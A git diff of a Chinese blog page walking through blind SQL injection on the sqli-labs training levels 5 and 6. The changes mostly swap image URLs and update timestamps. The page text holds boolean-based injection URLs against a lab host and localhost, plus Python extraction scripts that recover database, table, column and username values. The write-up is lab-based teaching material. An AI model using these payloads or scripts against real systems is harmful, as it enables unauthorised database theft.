@@ -150,6 +150,8 @@
             
             <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
             
+            <li><a target="_blank" href="/www.bugsafe.cn">Poache’s</a></li>
+            
         </ul>
     </div>
 </div>
@@ -726,7 +728,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2018-10-15 08:40:51'>2018-04-02 16:14</time>
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:15'>2018-04-02 16:14</time>
         
     </div>
     <div class="article-meta">
@@ -779,9 +781,9 @@
         <h1 id="sqli-labs5-6-盲注"><a href="#sqli-labs5-6-盲注" class="headerlink" title="sqli-labs5-6(盲注)"></a>sqli-labs5-6(盲注)</h1><p>[TOC]</p>
 <p>盲注分为以下三类：</p>
 <p>Booleanbase（普通盲注）<br>Timebase（时间盲注）<br>Errorbase（基于报错的盲注）</p>
-<h2 id="less-5：GET-基于错误-单引号-复杂注入语句"><a href="#less-5：GET-基于错误-单引号-复杂注入语句" class="headerlink" title="less-5：GET-基于错误-单引号-复杂注入语句"></a>less-5：GET-基于错误-单引号-复杂注入语句</h2><h3 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h3><p>如果所查询的用户id在数据库中，可以发现页面显示”You are in”，而不像前4关那样会显示出具体的账号密码。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171030_947.png" alt=""><br>如果sql语句查询结果不存在，则不会显示”You are in”</p>
+<h2 id="less-5：GET-基于错误-单引号-复杂注入语句"><a href="#less-5：GET-基于错误-单引号-复杂注入语句" class="headerlink" title="less-5：GET-基于错误-单引号-复杂注入语句"></a>less-5：GET-基于错误-单引号-复杂注入语句</h2><h3 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h3><p>如果所查询的用户id在数据库中，可以发现页面显示”You are in”，而不像前4关那样会显示出具体的账号密码。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171030_947.png" alt=""><br>如果sql语句查询结果不存在，则不会显示”You are in”</p>
 <p>这种类型的SQL注入属于盲注型，使用id=1\观察报错信息<br><a href="http://43.247.91.228:84/Less-5/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1\</a></p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201803171016_51.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171016_51.png" alt=""></p>
 <pre><code> MySQL server version for the right syntax to use near &#39;&#39;1\&#39; LIMIT 0,1&#39; at line 1
 </code></pre><p>错误分析：</p>
 <p>near ‘’1’’ LIMIT 0,1’ at line 1</p>
@@ -789,7 +791,7 @@
 <p>near ‘       ‘   1’  ‘ LIMIT 0,1            ‘ at line 1</p>
 <p>1’是手动输入的，但是还剩下一对双引号，说明后台sql语句应该是这样：</p>
 <p>select * from talbe where id = ‘input’ </p>
-<h3 id="2-猜测当前数据库长度："><a href="#2-猜测当前数据库长度：" class="headerlink" title="2.猜测当前数据库长度："></a>2.猜测当前数据库长度：</h3><p>首先获取当前数据库名的长度，用于之后的数据库名猜解<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=7)–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171110_250.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=8)–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171110_312.png" alt=""><br>上面的数字你可以从1开始递增，发现在 length(database())=8的时候，页面返回了正确信息，这说明当前数据库名长度为8</p>
+<h3 id="2-猜测当前数据库长度："><a href="#2-猜测当前数据库长度：" class="headerlink" title="2.猜测当前数据库长度："></a>2.猜测当前数据库长度：</h3><p>首先获取当前数据库名的长度，用于之后的数据库名猜解<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=7)–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171110_250.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=8)–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171110_312.png" alt=""><br>上面的数字你可以从1开始递增，发现在 length(database())=8的时候，页面返回了正确信息，这说明当前数据库名长度为8</p>
 <h3 id="3-猜测当前数据库名"><a href="#3-猜测当前数据库名" class="headerlink" title="3.猜测当前数据库名"></a>3.猜测当前数据库名</h3><p>方法一： python跑</p>
 <pre><code>import requests
 import string
@@ -834,9 +836,9 @@ if __name__==&quot;__main__&quot;:
 <blockquote>
 <p>▲ascii(substr((select database()),1,1))=98<br>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换<br>为 ascii 值</p>
 </blockquote>
-<p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;114%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171141_827.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&lt;116%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171141_686.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))=115%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171142_763.png" alt=""><br>所以当前数据库名的第一位字符为’s’。</p>
+<p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;114%23<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171141_827.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&lt;116%23<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171141_686.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))=115%23<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171142_763.png" alt=""><br>所以当前数据库名的第一位字符为’s’。</p>
 <p>猜测当前数据库名的第二位字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),2,1)&gt;100%23<br>以此类推，最后得到当前数据库名为“security”。 </p>
-<h3 id="4-猜测当前数据库的表名"><a href="#4-猜测当前数据库的表名" class="headerlink" title="4.猜测当前数据库的表名"></a>4.猜测当前数据库的表名</h3><p>猜测第一个数据表名的第一个字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171307_213.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;102%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171307_338.png" alt=""><br>d’&lt;’当前数据库第一个表名的第一个字符’&lt;’f’<br>当前数据库第一个表名的第一个字符为’e’。</p>
+<h3 id="4-猜测当前数据库的表名"><a href="#4-猜测当前数据库的表名" class="headerlink" title="4.猜测当前数据库的表名"></a>4.猜测当前数据库的表名</h3><p>猜测第一个数据表名的第一个字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100%23<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171307_213.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;102%23<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171307_338.png" alt=""><br>d’&lt;’当前数据库第一个表名的第一个字符’&lt;’f’<br>当前数据库第一个表名的第一个字符为’e’。</p>
 <p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘  and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108%23</p>
 <p>方法二：</p>
 <p>已经获取了数据库的名称，现在需要查出表的名称，这里需要使用ascii和substr这两个函数了。<br>获取完整表名有两个步骤：<br>①获取表的长度；<br>②利用ascii码获取单个表字符然后叠加。</p>
@@ -881,7 +883,7 @@ def main():
 
 if __name__==&quot;__main__&quot;:
     main()
-</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803171315_415.png" alt=""></p>
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171315_415.png" alt=""></p>
 <h3 id="5-爆列名-表users下的所有列名"><a href="#5-爆列名-表users下的所有列名" class="headerlink" title="5.爆列名(表users下的所有列名)"></a>5.爆列名(表users下的所有列名)</h3><p>接下来就要猜解每个表里的列的个数、列名以及列名长度，列名猜解，和上面原理都差不多，这里不再赘述，直接给出payload(以users表为例子)。<br>猜解列的个数<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and %d=(select count(column_name) from information_schema.columns where table_name=’users’)–+<br>猜解列名长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))–+<br>猜解列名<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))=97–+</p>
 <h3 id="6-爆出字段值-security-users下所有的账号密码"><a href="#6-爆出字段值-security-users下所有的账号密码" class="headerlink" title="6.爆出字段值(security.users下所有的账号密码)"></a>6.爆出字段值(security.users下所有的账号密码)</h3><p>最后就是要猜解每个列里面的具体字段的长度以及值了(这里以猜解username为例)<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and 1=(select count(username) from security.users)–+<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))–+<br>判断字段值<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))=95–+</p>
 <h3 id="完整python代码"><a href="#完整python代码" class="headerlink" title="完整python代码"></a>完整python代码</h3><pre><code>import requests
@@ -1018,7 +1020,7 @@ for column in column_list[1:]:
                             break
                 break
         print(&#39;[+]&#39;,dump_name)
-</code></pre><p>##less-6：GET-基于错误-双引号-复杂注入语句<br><a href="http://43.247.91.228:84/Less-6/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-6/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803172047_337.png" alt=""><br>your MySQL server version for the right syntax to use near ‘“1\” LIMIT 0,1’ at line 1<br> near ‘     “    1\    “ LIMIT 0,1    ‘ at line 1<br> 猜测后台语句：<br> select * from talbe where id = “input”<br>把less5代码中payload部分的’(单引号)改成”(双引号)即可</p>
+</code></pre><p>##less-6：GET-基于错误-双引号-复杂注入语句<br><a href="http://43.247.91.228:84/Less-6/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-6/?id=1\</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803172047_337.png" alt=""><br>your MySQL server version for the right syntax to use near ‘“1\” LIMIT 0,1’ at line 1<br> near ‘     “    1\    “ LIMIT 0,1    ‘ at line 1<br> 猜测后台语句：<br> select * from talbe where id = “input”<br>把less5代码中payload部分的’(单引号)改成”(双引号)即可</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 951207194@qq.com </span>
@@ -1036,7 +1038,7 @@ for column in column_list[1:]:
     <p><span>文章字数:</span><span class="post-count">2,179</span></p>
     <p><span>本文作者:</span><a href="javascript:void(0)" title="Mang0">Mang0</a></p>
     <p><span>发布时间:</span>2018-04-02, 16:14:58</p>
-    <p><span>最后更新:</span>2018-10-15, 08:40:51</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:15</p>
     <span>原始链接:</span><a class="post-url" href="/archives/4303333d/" title="sqli-labs5-6(盲注)">http://mang0.me/archives/4303333d/</a>
     <p>
         <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
